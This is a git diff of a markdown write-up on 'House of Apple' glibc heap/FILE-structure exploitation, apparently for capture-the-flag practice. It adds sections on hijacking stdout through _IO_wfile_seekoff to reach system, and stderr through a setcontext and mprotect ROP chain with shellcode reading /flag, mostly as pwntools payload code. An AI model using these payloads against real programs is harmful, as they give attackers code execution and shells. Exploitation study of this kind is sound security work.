@@ -1,5 +1,7 @@
 [toc]
 
+**Blog: https://4xura.com/pwn/pwn-travelgraph/**
+
 ## Background
 
 When program returns from `main`, or execute the `exit` function, it calls the `fcloseall` function. The call chain can be illustrated as:
@@ -14,11 +16,11 @@ exit
 
 It means, when the `exit` function is called, one of the cleanup tasks is to flush and close all open file streams. This is done through a chain of function calls shown above. And eventually `_IO_flush_all_lockp` iterates over the file streams stored in `_IO_list_all` (points to `_IO_2_1_stderr_` followingly by default):
 
-![alt text](images/_IO_flush_all_lockp_1.jpg)
+![_IO_flush_all_lockp_1](House of Apple.assets/_IO_flush_all_lockp_1.jpg)
 
 If we change the vtable pointer (struct `IO_jump_t`) inside the fake IO struct to `_IO_wxxxx_jumps`, it then quotes `_wide_data` and execute functions inside its vtable pointer. For example, if we make the vtable pointer as `_IO_wfile_jumps`:
 
-![alt text](images/_IO_flush_all_lockp_2.jpg)
+![_IO_flush_all_lockp_2](House of Apple.assets/_IO_flush_all_lockp_2.jpg)
 
 
 
@@ -153,7 +155,6 @@ _IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
 setcontext      = libc_base + libc.sym['setcontext'] + 61
 mprotect        = libc_base + libc.sym['mprotect']
 svcudp_reply 	= libc_base + 0x16a06a
-
 rop 	        = ROP(libc)
 p_rdi_r         = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
 p_rsi_r         = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
@@ -265,12 +266,13 @@ _IO_wdefault_xsgetn
 
 
 
-### HIJACK | __seekoff
+### HIJACK | _IO_wfile_seekoff
 
-**Analysis**: [link](https://c-lby.top/2024/08/05/house-of-apple2/#) by author *C_LBY*.
 **Requirements**: Arbitrary write on `stdout`.
 
-For functions like `puts` or `printf` (when outputs a string with `\n`), the `fp` points to the FILE struct `stdout`. And these functions execute `_IO_XSPUTN` (+0x38) internally, that we can modify the vtable pointer by adding offset 0x10 to let it execute `__seeoff` (+0x48). Check out the struct `_IO_wfile_jumps`.
+For functions like `puts` or `printf` (when outputs a string with `\n`), the `fp` points to the FILE struct `stdout`. And these functions execute `_IO_XSPUTN` (+0x38) internally, that we can modify the vtable pointer by adding offset 0x10 to let it execute `_IO_seeoff` (+0x48). Check out the struct `_IO_wfile_jumps`.
+
+(This methodology is actually introduced in **House of cat**, they are just similar.)
 
 **Attack Chain**:
 
@@ -288,26 +290,37 @@ puts
 - `_wide_data`: An address `A` in our control, namely `*(fp+0xa0)=A` (We can make the address `_IO_2_1_stdout_` in this case when we hijack the execution flow of `puts/printf` function).
 - `_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`: namely  `*(A+0x20) > *(A+0x18)`.
 - `_wide_data->_wide_vtable`: An address `B` in our control, namely `*(A+0xe0)=B`.
-- `_wide_data->_wide_vtable->overflow`: Starting function/gadget `C`  to hijack `RIP`, namely `*(B+0x68)=C`.
+- `_wide_data->_wide_vtable->overflow`: Starting function/gadget `C`  to hijack `RIP`, namely `*(B+0x18)=C`.
 
 #### GG | system
+
+**Analysis**: [link](https://c-lby.top/2024/08/05/house-of-apple2/#) by author *C_LBY*.
 
 **Version**: GLIBC 2.35
 
 When there's no sandbox to restrict functions like `execve`, we can manage to get shell by hijacking `_IO_2_1_stdout_` which will be applied in `puts/printf` function:
 
+> Only hijacking `_IO_2_1_stdout_` works, while `puts` is not taking `stdout` as the parameter.
+
 ```py
 # Gadgets
 _IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
 _IO_2_1_stdout_ = libc_base + libc.sym['_IO_2_1_stdout_']
+stdout		    = libc_base + libc.sym['stdout']
 system	        = libc_base + libc.sym['system']
 environ			= libc_base + libc.sym['_environ']
+rop 	        = ROP(libc)
+p_rdi_r         = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
+p_rsi_r         = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
+p_rdx_rbx_r     = libc_base + rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
+leave_r	        = libc_base + rop.find_gadget(['leave', 'ret'])[0]
+ret             = libc_base + rop.find_gadget(['ret'])[0]
 pa(_IO_wfile_jumps)
-pa(_IO_2_1_stdout_)
+pa(stdout)
 pa(system)
 pa(environ)
 
-fakeIO_addr = _IO_2_1_stdout_
+fakeIO_addr = stdout
 pa(fakeIO_addr)
 
 pl = flat({ 
@@ -331,6 +344,103 @@ pl = flat({
 - Or we can write an address near `_IO_stdfile_1_lock`.
 - If the program is using `read` function, we can put a heap address into `_lock`.
 - GDB Breakpoints: `_IO_file_xsputn`, `_IO_file_seekoff`.
+
+
+
+### HIJACK | stderr
+
+Idea provided by **House of Kiwi**.
+
+**Attack Chain**:
+
+```
+__malloc_assert
+	fflush(stderr)
+			_IO_file_sync
+```
+
+- `stderr->vtable`: `_IO_file_jumps`.
+- `rdx`: `IO_helper_jumps`.
+- `_IO_file_sync`: at offset **0x60** in the table.
+- Before calling `__IO_file_sync`, `__vfprintf_internal` will also call `_IO_new_file_xsputn` (+0x38) from the vtable.
+
+
+
+
+
+#### GG | setcontext
+
+**Version**: GLIBC 2.35
+
+```py
+# Gadgets
+_IO_list_all    = libc_base + libc.sym['_IO_list_all']
+_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
+_IO_2_1_stdout_ = libc_base + libc.sym['_IO_2_1_stdout_']
+stdout		    = libc_base + libc.sym['stdout']
+environ			= libc_base + libc.sym['_environ']
+setcontext      = libc_base + libc.sym['setcontext'] + 61
+mprotect        = libc_base + libc.sym['mprotect']
+rop 	        = ROP(libc)
+p_rdi_r         = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
+p_rsi_r         = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
+p_rdx_rbx_r     = libc_base + rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
+leave_r	        = libc_base + rop.find_gadget(['leave', 'ret'])[0]
+ret             = libc_base + rop.find_gadget(['ret'])[0]
+add_rsp_0x28_r  = libc_base + 0x0000000000045f25
+add_rsp_0xa8_r  = libc_base + 0x00000000000434a7
+pa(_IO_list_all)
+pa(_IO_wfile_jumps)
+pa(stdout)
+pa(environ)
+pa(setcontext)
+
+fakeIO_addr    = 0xdeadbeef
+mprotect_chain = [p_rdi_r, fakeIO_addr&(~0xfff), p_rsi_r, 0x4000, \
+                  p_rdx_rbx_r, 7, 0, mprotect, fakeIO_addr+0x140]	# 0x48 bytes
+orw_chain      = asm(shellcraft.cat('/flag'))	# 0x23 bytes
+pa(fakeIO_addr)
+
+pl = flat({
+    # fake_IO  
+    0: {  
+        0x0:  0,	# _flag
+        0x88: environ-0x10, 		# _lock
+        0xa0: fakeIO_addr+0x100,    # _wide_data=rdx 
+        0xd8: _IO_wfile_jumps+0x10, # vtable (_IO_wfile_seekoff)
+    },
+    # fake_IO->_wide_data
+    0x100: { 
+        0x18: 0,    # _IO_write_base
+        0x20: 1,    # _IO_write_ptr 
+        0x40: orw_chain,	# mprotect ->
+        0xa0: [fakeIO_addr+0x230, ret],	# setcontext ->
+        0xe0: fakeIO_addr+0x200,	# _wide_vtable
+    },
+    # fake_IO->wide_data->_wide_vtable
+    0x200: {
+        # <+61>:  mov rsp, [rdx+0xa0]
+        # <+294>: mov rcx, [rdx+0xa8]
+        # <+301>: push rcx
+        # <+334>: ret
+        0x18: setcontext,	# _IO_WOVERFLOW
+        0x30: mprotect_chain
+    }
+}, filler='\0')
+
+# largebin attack: bk_nextsize=stdout-0x20
+```
+
+- Overwriting `_lock` pointer is not necessary if we don't attack the `stdout` FILE struct.
+- If we aim to hijack `stdout`, the pointer `_lock` should be considered:
+  - `[_lock]` readable;
+  - `[_lock+8]` readable;
+  - `[[_lock]]` writable.
+- Or we can write an address near `_IO_stdfile_1_lock`.
+- If the program is using `read` function, we can put a heap address into `_lock`.
+- GDB Breakpoints: `_IO_file_xsputn`, `_IO_file_seekoff`.
+
+
 
 
 
